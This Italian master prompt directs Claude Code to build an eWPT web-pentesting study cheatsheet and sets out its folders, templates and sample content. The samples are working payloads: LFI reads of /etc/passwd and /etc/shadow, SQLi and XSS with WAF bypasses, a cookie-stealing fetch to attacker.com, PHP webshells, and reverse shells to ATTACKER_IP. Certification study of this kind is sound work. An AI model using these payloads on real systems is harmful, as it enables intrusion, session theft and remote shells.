# 🎯 eWPT Cheatsheet Generator - Master Prompt

**Versione:** 1.0  
**Data:** Settembre 2026  
**Certificazione Target:** eWPT v2 (INE/OffSec)  
**Livello:** Intermediate (post-eJPTv2)

---

## 📌 OBIETTIVO FINALE

Generare un **cheatsheet completo, modularizzato e navigabile** per la certificazione eWPT che sia:
- ✅ Copy-paste ready (comandi, payload, script pronti all'uso)
- ✅ Strutturato gerarchicamente (da link di indice)
- ✅ Ricco di esempi pratici e output attesi
- ✅ Fornisce trigger per laboratori e casi reali
- ✅ Manutenibile e facile da espandere

---

## 📂 STRUTTURA CARTELLE

```
eWPT-Cheatsheet/
├── 📄 INDEX.md                    # Hub di navigazione principale
├── 📄 QUICK-START.md              # Flusso rapido di 30 min per starter
│
├── 📁 00-Fundamentals/            # Prerequisiti + refresh
│   ├── Networking-Basics.md
│   ├── HTTP-HTTPS-Deep-Dive.md
│   ├── Linux-for-WebHacking.md
│   └── Burp-Suite-Setup.md
│
├── 📁 01-Reconnaissance/
│   ├── 01-Footprinting.md
│   ├── 02-Fingerprinting.md
│   ├── 03-OSINT-Tools.md
│   ├── 04-Dorking.md
│   └── Lab-Challenges.md
│
├── 📁 02-Scanning-Enumeration/
│   ├── 01-Port-Scanning.md
│   ├── 02-Service-Detection.md
│   ├── 03-Web-Enumeration.md
│   ├── 04-Virtual-Host-Enum.md
│   ├── 05-API-Enumeration.md
│   └── Lab-Challenges.md
│
├── 📁 03-File-Inclusion/
│   ├── 01-LFI-Basics.md
│   ├── 02-LFI-Advanced.md
│   ├── 03-RFI-Techniques.md
│   ├── 04-Wrappers-PHP.md
│   ├── 05-Evasion-Filters.md
│   └── Lab-Challenges.md
│
├── 📁 04-SQL-Injection/
│   ├── 01-SQLi-Fundamentals.md
│   ├── 02-Error-Based-SQLi.md
│   ├── 03-Union-Based-SQLi.md
│   ├── 04-Blind-SQLi.md
│   ├── 05-Time-Based-Blind.md
│   ├── 06-Encoding-Bypasses.md
│   ├── 07-SQLMap-Automation.md
│   └── Lab-Challenges.md
│
├── 📁 05-Cross-Site-Scripting/
│   ├── 01-XSS-Fundamentals.md
│   ├── 02-Reflected-XSS.md
│   ├── 03-Stored-XSS.md
│   ├── 04-DOM-XSS.md
│   ├── 05-Encoding-Payloads.md
│   ├── 06-WAF-Evasion.md
│   ├── 07-Cookie-Stealing.md
│   └── Lab-Challenges.md
│
├── 📁 06-Authentication-Authorization/
│   ├── 01-Session-Management.md
│   ├── 02-Session-Hijacking.md
│   ├── 03-CSRF-Attacks.md
│   ├── 04-IDOR.md
│   ├── 05-Credential-Attacks.md
│   ├── 06-JWT-Exploitation.md
│   └── Lab-Challenges.md
│
├── 📁 07-Business-Logic/
│   ├── 01-Logic-Flaws.md
│   ├── 02-Race-Conditions.md
│   ├── 03-Account-Enumeration.md
│   ├── 04-Timing-Attacks.md
│   ├── 05-Price-Manipulation.md
│   └── Lab-Challenges.md
│
├── 📁 08-Exploitation-PostEx/
│   ├── 01-File-Upload-Abuse.md
│   ├── 02-RCE-Techniques.md
│   ├── 03-Reverse-Shells.md
│   ├── 04-Webshell-Deployment.md
│   ├── 05-Privilege-Escalation.md
│   ├── 06-Data-Exfiltration.md
│   └── Lab-Challenges.md
│
├── 📁 09-Tools-Reference/
│   ├── Burp-Suite-Recipes.md
│   ├── Command-Line-Tools.md
│   ├── Scripting-Snippets.md
│   ├── Wordlists-Location.md
│   └── Automation-Scripts.md
│
├── 📁 10-Reporting-Notes/
│   ├── Vulnerability-Template.md
│   ├── CVSS-Scoring.md
│   ├── Report-Checklist.md
│   └── Executive-Summary-Template.md
│
└── 📁 11-Lab-Walkthroughs/
    ├── HTB-Bounty.md
    ├── HTB-Beep.md
    ├── HTB-Popcorn.md
    ├── HTB-Cronos.md
    ├── HTB-Nibbles.md
    ├── TryHackMe-Burp-Complete.md
    ├── PortSwigger-SQLi-Labs.md
    ├── PortSwigger-XSS-Labs.md
    └── OWASP-WebGoat-Notes.md
```

---

## 📋 TEMPLATE PER OGNI FILE

Ogni file `.md` deve seguire questo template:

```markdown
# [TITOLO SEZIONE]

**Difficoltà:** [Beginner | Intermediate | Advanced]  
**Time to Master:** [Hh]  
**Prerequisiti:** [Link a file prerequisito]  
**Lab:** [Nome HTB / TryHackMe associato]

---

## 🎯 Obiettivo
[1-2 paragrafi su cosa imparerai e perché è critico per eWPT]

---

## 📚 Concetti Chiave

### Concetto 1
[Spiegazione breve + esempio]

### Concetto 2
[Spiegazione breve + esempio]

---

## 🛠️ Strumenti

| Tool | Comando Base | Output | Note |
|------|-------------|--------|------|
| tool1 | `comando` | output atteso | Quando usarlo |
| tool2 | `comando` | output atteso | Quando usarlo |

---

## 📝 Payload / Esempi

### Esempio 1: [Caso d'uso specifico]

**Setup:**
- Target: [tipo app]
- Vulnerability: [tipo vuln]

**Step-by-step:**
\`\`\`bash
# Comando 1
comando1 target

# Comando 2
comando2 target --flag
\`\`\`

**Output atteso:**
\`\`\`
output qui
\`\`\`

**Spiegazione:** [Perché funziona]

---

### Esempio 2: [Caso d'uso specifico]
[Simile al formato sopra]

---

## 🚨 Evasion / Bypass Techniques

### Tecnica 1
[Come aggirare i filtri / WAF per questo argomento]

### Tecnica 2
[Come aggirare i filtri / WAF per questo argomento]

---

## 🧪 Lab Hands-On

### Lab 1: [HTB / TryHackMe / PortSwigger]
**Obiettivo:** [Cosa fare]  
**Difficulty:** [Facile | Medio | Difficile]  
**Time:** [30 min | 1h | 2h]  

**Walkthrough breve:**
1. Step 1
2. Step 2
3. Step 3

---

## ⚠️ Common Mistakes

- ❌ Errore 1 → ✅ Come evitarlo
- ❌ Errore 2 → ✅ Come evitarlo

---

## 📚 Link Utili

- [OWASP page](link)
- [PortSwigger Academy](link)
- [HTB Lab](link)

---

## 🔗 Connessioni

- **Prerequisito:** [Link file]
- **Prossimo Step:** [Link file]
- **Combinazione con:** [Link file]

---

## ✅ Checklist di Padronanza

- [ ] Ho capito il concetto teorico
- [ ] Ho praticato almeno 3 lab
- [ ] Ho creato un payload custom
- [ ] Ho documentato il mio approccio
- [ ] So distinguere questo dall'argomento precedente

---

## 📌 Note Personali

[Spazio per note dell'utente]
```

---

## 🎨 FORMATTING GUIDELINES

### Markdown Rules
- **Heading Hierarchy:** 
  - `#` = File principale
  - `##` = Sezioni grandi
  - `###` = Sottosezioni
  - `####` = Micro-details
  
- **Code Blocks:**
  - Bash: ` ```bash `
  - Python: ` ```python `
  - SQL: ` ```sql `
  - Payload generic: ` ```payload `
  
- **Callouts:**
  - 🎯 = Obiettivi
  - 📚 = Concetti
  - 🛠️ = Strumenti
  - 📝 = Esempi/Payload
  - 🚨 = Attenzione/Bypass
  - ✅ = Checklist
  - ❌ = Errori da evitare
  - 🔗 = Link/Relazioni
  - ⏱️ = Timing
  - 🧪 = Lab

### Colori / Enfasi
- **Comandi:** sempre in backtick o code block
- **Variabili:** `$VARIABILE` o `{VARIABILE}`
- **Flag:** `--flag-name`
- **Payload:** Code block dedicato + spiega linea per linea

---

## 📊 CONTENUTO SPECIFICO PER OGNI SEZIONE

### 00-Fundamentals/
**Che cosa:** Prerequisiti e ripasso da eJPTv2
- Networking (OSI, TCP/IP, socket)
- HTTP/HTTPS deep-dive (headers, cookies, sessions)
- Linux command line avanzato
- Burp Suite setup (proxy, certificate, basic workflow)

**Output per file:**
- Nessun payload qui; solo concetti + strumenti
- Focalizzato su "come leggere request/response"
- Setup guide per Burp + VM

---

### 01-Reconnaissance/
**Che cosa:** Information gathering su target web

**Per ogni file:**
- **Footprinting:** whois, DNS, registrar, cloud detection
- **Fingerprinting:** identificare tech (versioni, framework)
- **OSINT:** social media, email, domain history
- **Dorking:** Google dorking, GitHub dorking, site-specific search

**Payload/Comandi specifici:**
```bash
# Footprinting
whois dominio.com
nslookup dominio.com
dig dominio.com

# Fingerprinting
curl -I http://target.com
whatweb http://target.com
nmap -sV -p 80,443 target.com

# OSINT
site:github.com dominio
site:linkedin.com target company
```

**Sezione Evasion:** Come non farti scoprire durante recon (VPN, rotating proxy, frequency)

---

### 02-Scanning-Enumeration/
**Che cosa:** Mappare superfici di attacco

**Per ogni file:**
- Port scanning (nmap, masscan)
- Service detection (version, default pages)
- Web enumeration (directory brute-force, file discovery)
- Virtual host enumeration
- API endpoint discovery

**Payload/Comandi:**
```bash
# Fast port scan
nmap -p- --min-rate=5000 target.com

# Service detection
nmap -sV -p 80,443,8080 target.com

# Directory brute
gobuster dir -u http://target.com -w wordlist.txt

# Virtual host
ffuf -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com
```

---

### 03-File-Inclusion/
**Che cosa:** LFI/RFI exploitation

**Per ogni file:**
- LFI basics (path traversal, encoding)
- LFI advanced (log poisoning, PHP wrappers)
- RFI (remote file inclusion, exfil)
- Wrappers (php://, data://, filter://)
- Evasion (null bytes, encoding, path variations)

**Payload specifici:**
```
# LFI basic
../../../../../../../etc/passwd
../../../../../../../../etc/shadow

# LFI encoding
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,BASE64_PAYLOAD

# RFI
?page=http://attacker.com/shell.php
```

---

### 04-SQL-Injection/
**Che cosa:** SQLi in tutte le varianti

**Per ogni file:**
- Fundamentals (sintassi SQL, injection points)
- Error-based (UNION, subqueries)
- UNION-based (column count, UNION SELECT)
- Blind boolean (conditional output)
- Blind time-based (sleep, benchmark)
- Encoding bypasses (quotes, backslash, UTF-8, hex)
- SQLMap automation

**Payload specifici (GRANDI BLOCCHI):**

```sql
-- Error-based
' OR 1=1 --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT version(), user(), database() --

-- UNION-based
' UNION SELECT table_name FROM information_schema.tables --
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT concat(username, ':', password) FROM users --

-- Blind boolean
' OR '1'='1
' AND 1=1 --
' AND 1=2 --

-- Time-based blind
' OR IF(1=1, SLEEP(5), 0) --
' AND SLEEP(5) --
' OR BENCHMARK(5000000, SHA1('test')) --

-- Encoding bypasses
' OR \'1\'=\'1
' OR 1 LIKE 1
' OR 'a'='a
' OR 0x31=0x31  (hex encoding)
' UNION /*!50000SELECT*/ 1,2,3 --  (comment bypass)
```

**Sezione evasion:** WAF bypass, comment variations, keyword encoding

---

### 05-Cross-Site-Scripting/
**Che cosa:** XSS in tutte le varianti

**Per ogni file:**
- Fundamentals (DOM, event handlers)
- Reflected XSS (payload in URL)
- Stored XSS (payload in database)
- DOM XSS (JS-based manipulation)
- Encoding payloads (HTML entity, URL, Unicode)
- WAF evasion (case variation, alternative tags, event handlers)
- Cookie stealing (document.cookie, exfil)

**Payload specifici (GRANDI BLOCCHI):**

```javascript
// Reflected / Stored basic
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Encoded
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<img src=x onerror=String.fromCharCode(97,108,101,114,116,'XSS')>

// WAF bypasses
<img src=x onerror="alert`XSS`">
<img src=x OneRrOr=alert('XSS')>
<img src=x onerror="a\lert('XSS')">
<script>eval/**/(alert('XSS'))</script>

// Cookie stealing
<script>
fetch('http://attacker.com/steal.php?c=' + document.cookie)
</script>

// DOM XSS
document.body.innerHTML = userInput  // Vulnerable
document.getElementById('id').textContent = userInput  // Safe
```

**Sezione evasion:** Polyglot payload, alternative event handlers, case variation, null bytes

---

### 06-Authentication-Authorization/
**Che cosa:** Session hijacking, CSRF, IDOR, credential attacks

**Per ogni file:**
- Session management (tokens, cookies)
- Session fixation / hijacking
- CSRF (cross-site request forgery)
- IDOR (insecure direct object reference)
- Credential attacks (brute-force, dictionary)
- JWT exploitation

**Payload/Tecnica specifici:**

```html
<!-- CSRF form -->
<form action="http://target.com/admin/change_password" method="POST">
  <input type="hidden" name="new_password" value="hacker123">
  <input type="submit" value="Click here">
</form>

<!-- IDOR -->
GET /api/user/123/profile  # Prova 124, 125, ecc.
GET /admin/user/1/details
```

---

### 07-Business-Logic/
**Che cosa:** Falle nella logica applicativa

**Per ogni file:**
- Logic flaws (bypassare validation)
- Race conditions (concurrent requests)
- Account enumeration (timing differences)
- Timing attacks (delay-based inference)
- Price manipulation
- Order processing bypass

**Tecnica specifiche:**

```bash
# Race condition (2 request parallele)
burp repeater: send 2 request identiche contemporaneamente

# Account enumeration timing
login(valid_user)    # 500ms
login(invalid_user)  # 200ms

# Price manipulation
intercepta request di checkout
modifica price: 100 → 1
forward
```

---

### 08-Exploitation-PostEx/
**Che cosa:** RCE, reverse shell, privilege escalation

**Per ogni file:**
- File upload abuse (RCE via upload)
- RCE techniques (system, exec, eval, command injection)
- Reverse shells (bash, Python, PHP, nc)
- Webshell deployment (persistence)
- Privilege escalation (sudo, SUID, capabilities)
- Data exfiltration (metodi di esfil)

**Payload specifici (GRANDI BLOCCHI):**

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
```

```bash
# Reverse shells
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
nc -e /bin/sh ATTACKER_IP PORT
```

---

### 09-Tools-Reference/
**Che cosa:** Comandi pronti, script, wordlist locations

**Per ogni file:**
- Burp Suite recipes (intruder, repeater, macro)
- Command-line tools quick ref (nmap, curl, wget flags)
- Scripting snippets (Python for payload generation, Bash automation)
- Wordlist locations (seclists, rockyou)
- Automation scripts (batch scanning)

**Contenuto:**
```bash
# Burp intruder via CLI (non esiste, ma mostra workaround)
# Command line scanning
nmap -sV -p- --script vuln target.com

# Python payload generator template
#!/usr/bin/env python3
import sys
payload = "' OR 1=1 --"
print(f"SELECT * FROM users WHERE id={payload}")
```

---

### 10-Reporting-Notes/
**Che cosa:** Template e linee guida per report

**Per ogni file:**
- Vulnerability template (title, description, impact, remediation)
- CVSS scoring (calculator + examples)
- Report checklist (cosa deve esserci)
- Executive summary template

---

### 11-Lab-Walkthroughs/
**Che cosa:** Walkthrough di lab reali

**Per ogni lab:**
- **Difficulty:** [Factor]
- **Time to root:** [Estimated]
- **Vulnerability:** [tipo]
- **Step-by-step:**
  1. Recon
  2. Enumeration
  3. Exploitation
  4. Post-exploitation
- **Key lessons:** [Cosa impari]

---

## 🔗 INDEX.md TEMPLATE

```markdown
# eWPT Cheatsheet - Main Index

Welcome to your complete eWPT study guide!

## Quick Navigation

### 🚀 For Beginners
- [Quick Start (30 min)](QUICK-START.md)
- [Fundamentals](00-Fundamentals/)

### 🎯 By Topic
- [Reconnaissance](01-Reconnaissance/)
- [Scanning & Enumeration](02-Scanning-Enumeration/)
- [File Inclusion](03-File-Inclusion/)
- [SQL Injection](04-SQL-Injection/)
- [Cross-Site Scripting](05-Cross-Site-Scripting/)
- [Authentication & Authorization](06-Authentication-Authorization/)
- [Business Logic](07-Business-Logic/)
- [Exploitation](08-Exploitation-PostEx/)

### 🛠️ Resources
- [Tools Reference](09-Tools-Reference/)
- [Reporting](10-Reporting-Notes/)

### 🧪 Practice
- [Lab Walkthroughs](11-Lab-Walkthroughs/)

---

## Study Timeline (3-4h/day)

**Week 1-2:** Fundamentals + Reconnaissance + Scanning  
**Week 3-4:** File Inclusion + SQLi  
**Week 5-6:** XSS + Authentication  
**Week 7-8:** Business Logic + Exploitation  
**Week 9:** Lab practice + Reporting  

---

## Exam Tips

1. Start with enumeration (80% of the battle)
2. Manual exploitation > automated tools
3. Document everything as you go
4. Practice on retired HTB machines
5. Read error messages carefully

---

## Progress Tracker

- [ ] All Fundamentals understood
- [ ] Recon + Scanning mastered
- [ ] SQLi (all variants) practiced
- [ ] XSS (all variants) practiced
- [ ] Authentication flaws understood
- [ ] 5+ lab machines completed
- [ ] Report written and reviewed
- [ ] Ready for exam

---

[Last updated: September 2026]
```

---

## ⚙️ GENERATION INSTRUCTIONS FOR CLAUDE CODE

**When generating files, Claude Code should:**

1. ✅ Create each file with correct filename and structure
2. ✅ Use consistent emoji/formatting across all files
3. ✅ Link between files using `[Link Text](path/to/file.md)`
4. ✅ Generate ACTUAL payloads (not placeholders)
5. ✅ Include real commands that work on standard systems (Kali, Ubuntu)
6. ✅ Add "common mistakes" and "evasion techniques" for every topic
7. ✅ Provide 3-5 concrete examples per major concept
8. ✅ Include lab references with difficulty + time estimate
9. ✅ Use tables for quick reference (tools, parameters, output)
10. ✅ Create INDEX.md e QUICK-START.md per prima (entry points)

---

## 📊 QUALITY CHECKLIST

Each generated file should pass:

- [ ] Syntax corretta (markdown valido)
- [ ] Link interni coerenti
- [ ] Payload testati (o nota se ipotetico)
- [ ] Almeno 3 esempi per sezione
- [ ] Emoji usate coerentemente
- [ ] Timing stimato per sezione
- [ ] Lab reference provide (HTB, TryHackMe, PortSwigger)
- [ ] Evasion techniques incluse
- [ ] Common mistakes documented
- [ ] Legible anche da mobile (no huge code blocks)

---

## 🎓 LEARNING OBJECTIVES

Al termine di questo cheatsheet, dovresti essere in grado di:

1. ✅ Eseguire recon completo su target web sconosciuto
2. ✅ Identificare e sfruttare SQLi (tutti i tipi)
3. ✅ Identificare e sfruttare XSS (tutti i tipi)
4. ✅ Bypassare authentication / IDOR
5. ✅ Identificare business logic flaws
6. ✅ Da vulnerabilità → RCE → reverse shell
7. ✅ Scrivere report professionale con CVSS
8. ✅ Passare eWPT exam al primo tentativo

---

## 📝 NOTES

- **Keep it modular:** Ogni file deve poter stare solo
- **Keep it practical:** Payload vs teoria = 70/30
- **Keep it updated:** Aggiungi note personali durante lo studio
- **Keep it navigable:** Tanti link interni, non linear reading
- **Keep it honest:** Nota se payload è ipotetico vs verified

---

## 🚀 START HERE

Passa questo file a Claude Code e chiedi:

> "Genera il cheatsheet eWPT seguendo le istruzioni in questo file. Inizia da INDEX.md e QUICK-START.md, poi procedi sezione per sezione. Assicurati che ogni file sia auto-contained ma linkato agli altri."

Then sit back and let it build 🛠️

---

**Fine del prompt. Buono studio! 🎯**
